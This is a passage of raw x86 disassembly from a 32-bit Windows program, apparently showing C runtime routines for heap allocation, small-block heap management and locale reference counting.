  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
